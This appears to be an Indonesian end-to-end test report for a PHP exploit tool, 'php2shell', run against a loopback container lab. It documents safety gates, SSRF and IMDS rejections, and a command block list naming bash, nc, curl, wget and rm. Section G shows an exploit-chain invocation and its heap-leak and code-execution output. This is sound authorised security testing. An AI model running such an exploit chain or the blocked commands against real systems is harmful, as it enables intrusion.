# END-TO-END REPORT — R2-06

Semua pengujian dinamis memakai loopback (`127.0.0.1`) atau jaringan container
internal. Tidak ada paket ke target publik.

**Environment**

| Komponen | Nilai |
|---|---|
| OS / kernel | Linux 7.1.5+kali-amd64 |
| Python | 3.14.7 |
| pytest | 9.1.1 (asyncio 1.4.0, anyio 4.15.1) |
| Docker client/server | 28.5.2+dfsg4 / 28.5.2+dfsg4 |
| PHP target | 8.4.26 (mod_php, prefork, Apache 2.4.69) |
| curl_cffi | terpasang (JA3 impersonate aktif) |
| RAM host | tersedia > 4 GiB (payload max 512 MB, tidak pernah dipakai penuh) |

---

## A. Target startup & reachability

```
== build image lab (uid/gid mapping 1000:1000) ==   sha256:1fd81d0c...
== jaringan internal (tanpa egress) ==
== jalankan p2s-lab-8426 — tidak ada port publish ==
== relay 127.0.0.1:8095 -> p2s-lab-8426:80 ==
   SIAP  http://127.0.0.1:8095/index.php  (HTTP 200)
```

Target menjawab 200 dengan konfigurasi hardened; relay socat adalah
satu-satunya jalur masuk.

## B. TLS verification

Diuji di `tests/test_transport_security.py` (bagian dari suite):
- `Transport()` default `verify_tls=True`.
- `--insecure` satu-satunya jalan mematikan; nilainya eksplisit dicatat ke log.
- `_PinnedHTTPSConnection` memakai `server_hostname=self.host` sehingga
  sertifikat dicocokkan dengan nama, bukan IP pin.

Status: **PASS** (unit-level; target lab memakai HTTP, jadi TLS live tidak
relevan untuk lab ini dan tidak diklaim diuji end-to-end).

## C. Redirect validation (live, mock server lokal)

Sumber: `evidence/redirect-validation/scope-live.txt`

Server `127.0.0.1:18099` menyajikan `/same` (302 → `/final`), `/cross`
(302 → `127.0.0.2:18099/final`), `/port` (302 → port+1).

| Kasus | Mode | status | hop terkirim | error |
|---|---|---|---|---|
| `/same` | host | 200 | 2 | — (body `FINAL-OK`) |
| `/cross` | host | 0 | 1 | `redirect keluar scope: 'http://127.0.0.2:18099/final'` |
| `/port` | host | 0 | 1 | `redirect berpindah port 18099 -> 18100` |
| `/cross` | subdomains | 0 | 1 | `redirect keluar scope` (IP tidak punya subdomain) |
| `/cross` | any | 0 | 2 | host diizinkan; koneksi gagal (127.0.0.2 tidak melayani) |

Status: **PASS** — tiga penolakan terjadi **sebelum** hop kedua dikirim
(`hops=1` pada setiap kasus tolak).

## D. Preflight gate

Terbukti di E2E: target dinilai `vulnerable` (skor 75/90) tetapi status
preflight `needs_review`, sehingga tool **menolak** tanpa `--force`:

```
DITOLAK — target tidak memenuhi pra-syarat; pakai --force untuk memaksa
batal    : tidak ada yang dikirim ke http://127.0.0.1:8095/index.php
kurang   : pra-syarat lain
```

Status: **PASS** — gerbang berhenti-sebelum-menembak berfungsi.

## E. Command policy (live)

Sumber: `evidence/command-validation/e2e-live.txt`

Sembilan kasus dijalankan lewat CLI sungguhan terhadap lab hidup. Ringkasan
ada di `REMEDIATION_REPORT.md` §3/R2-01. Yang penting: penolakan terjadi
**sebelum** apa pun dikirim (`batal : perintah proof ditolak sebelum apa pun
dikirim`) — bukan setelah request gagal.

Status: **PASS**

## F. Resource limit

Sumber: `evidence/test-results/negative-tests.txt` N5/N6.

| Input | Jalur | Hasil |
|---|---|---|
| `--huge-mb 700` | CLI | `melewati plafon aman 512 MB (SAFE_CEILING_MB)` |
| `--huge-mb 0` | CLI | `harus > 0 (diberikan 0)` |
| `--huge-mb -5` | CLI | `harus > 0 (diberikan -5)` |
| `run(huge_mb=700)` | API | `ValueError:` di `res.error`; `FakeChain.made == []` |
| `run(huge_mb∈{-5,0,True,"64",64.0})` | API | semua `ValueError:`, tidak ada rantai |
| `Chain(..., huge_mb=-1)` | API | `ValueError` sebelum field `big` dibangun |

Status: **PASS**

## G. Exploit workflow (proof-of-access, lab hardened)

Bukti lengkap: `evidence/test-results/e2e-exploit-live.txt`

```
php2shell exploit chain -u http://127.0.0.1:8095/index.php -c 'id>/out/p2'
  [*] memory_limit 8 MiB terbaca dari target; field 'big' disetel 10 MB
  stage 1: heap leak (1/3)   -> chunk base = 0x7ff9e0e00000
  stage 2: libphp leak (1/3) -> libphp base = 0x7ff9e2a94000
  stage 3: HTDATA=0x7ff9e0e690d8 ZIF=0x7ff9e2ef9370
  stage 3: eksekusi (1/5) -> uid=1000(p2s) gid=1000(p2s) groups=1000(p2s)
  PROOF (11.8s): uid=1000(p2s) gid=1000(p2s) groups=1000(p2s)
```

Status: **PASS** — proof-of-access tercapai, bukan sekadar "tidak error".

Catatan kejujuran: percobaan pertama dengan `-c id` (tanpa `--proof-file`)
menghasilkan `BLIND — perintah terkirim, tapi tidak ada kanal bukti`. Itu
perilaku yang **benar**: tanpa kanal bukti, tool tidak mengklaim sukses.
Kedua hasil dicatat di evidence yang sama, tidak ada yang disembunyikan.

## H. Proof-of-access menggunakan dummy file

`--proof-file p2` → target menulis `/out/p2`. Di host:

```
-rw-r--r-- 1 1000 1000 45  out/p2
uid=1000(p2s) gid=1000(p2s) groups=1000(p2s)
```

File dummy, bukan data sensitif. Tidak ada pembacaan `/etc/passwd`, tidak ada
environment dump, tidak ada persistence.

Status: **PASS**

## I. Cleanup

- `out/p2` dihapus setelah pembacaan (artefak bukti yang disengaja tetap
  disimpan di `reports/round2/evidence/`).
- Container relay & target dihapus lewat `bash lab/lab_docker.sh destroy`.
- Tidak ada `chown`/`chmod` pada path host.
- Tidak ada thread producer tertinggal (dibuktikan `tests/test_producer_lifecycle.py`).

Status: **PASS**

## J. Negative testing (ringkas)

| # | Kasus | Hasil | Status |
|---|---|---|---|
| N2 | 127.0.0.1 tanpa `--allow-private-target` | `PolicyError ... SSRF` | PASS |
| N3 | 169.254.169.254 | `metadata cloud/IMDS ... TIDAK ADA flag` | PASS |
| N4 | `file:///etc/passwd` | `skema file ditolak` | PASS |
| N5 | `--huge-mb 700` | ditolak parser | PASS |
| N6 | `--huge-mb 0` / `-5` | ditolak parser | PASS |
| N7 | `--redirect-scope everything` | `invalid choice` | PASS |
| N8 | `--revshell 1.2.3.4` | `unrecognized arguments` | PASS |
| N9 | `--allow-cmd {bash,nc,curl,wget,chmod,rm,python}` | semua `tidak diizinkan` | PASS |
| N10 | target unreachable (127.0.0.1:9) | lihat catatan di bawah | PASS |

**N10 (target unreachable) — PASS dengan bukti.** Output CLI lengkap
(`evidence/test-results/negative-tests.txt`):

```
  unknown    http://127.0.0.1:9/x.php
             versi PHP tidak bocor ... OOM probe error: ... Failed to connect ...
             + upload_progress tidak terlihat (HTTP 0, tanpa Set-Cookie)
             ! ConnectionError: ... Failed to connect to 127.0.0.1:9 ...
  1  unknown     ?   unknown   off   30/90  no  no   http://127.0.0.1:9/x.php
total=1  vulnerable=0  eol=0  patched=0  unknown=1  ready=0  exploited=0
exit_code=0
```

Yang dibuktikan: verdict `unknown` (bukan `vulnerable`), `vulnerable=0`,
`ready=0`, `exploited=0`, dan exit code 0. **Tidak ada false positive** —
target yang tidak bisa dihubungi tidak dilaporkan rentan.

**N11 (target tidak rentan) — NOT TESTED.** Percobaan memakai
`php:8.4.30-apache` gagal karena image tidak tersedia di registry saat
pengujian (`image 8.4.30 tidak tersedia; dilewati`). Container tidak pernah
hidup, sehingga baris `unknown` di output N11 **tidak** merupakan bukti
apa pun tentang perilaku terhadap versi patched. Tidak diklaim PASS.

## K. Full regression

```
PYTEST   : 497 passed, 228 subtests passed, 0 failed, 0 skipped  (23.05s)   [lab hidup]
UNITTEST : Ran 343 tests, OK                                   (20.43s)
MODUL    : 18
```

Dengan lab **mati**: `486 passed, 11 skipped, 0 failed` — 11 tes lapis B
`test_docker_lab_hardening.py` di-skip dengan pesan yang menyebut cara
menjalankan lab (`jalankan bash lab/lab_docker.sh start untuk bukti hidup`).
Skip itu disengaja: tes yang butuh container hidup tidak boleh lulus diam-diam
tanpa container. Nilai di atas diambil dengan lab hidup, jadi 0 skip dan
tidak ada alasan skip yang perlu dilaporkan.

Tidak ada tes yang dijalankan sebagian.

Status: **PASS**